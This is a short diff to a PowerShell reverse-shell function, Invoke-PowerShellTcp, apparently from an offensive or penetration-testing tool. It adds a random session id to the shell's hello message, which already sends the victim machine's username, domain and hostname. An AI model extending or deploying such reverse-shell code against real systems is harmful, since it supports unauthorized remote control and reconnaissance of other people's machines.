@@ -29,6 +29,10 @@ function Invoke-PowerShellTcp
         [Parameter(ParameterSetName="reverse", Mandatory = $false)]
         [Int] $LifeTime=3
     )
+
+    $id = ''
+    1..4 | %{ $id += '{0:x}' -f (Get-Random -Max 256) }
+
     function Read-ShellPacket {
         param (
             [Parameter(Position = 0)] $Stream
@@ -71,6 +75,7 @@ function Invoke-PowerShellTcp
         @{
             "msg_type" = "SHELL_HELLO"
             "data" = @{
+                "id" = $id
                 "user" = "$ENV:USERNAME"
                 "domain" = "$ENV:USERDOMAIN"
                 "hostname" = "$ENV:COMPUTERNAME"
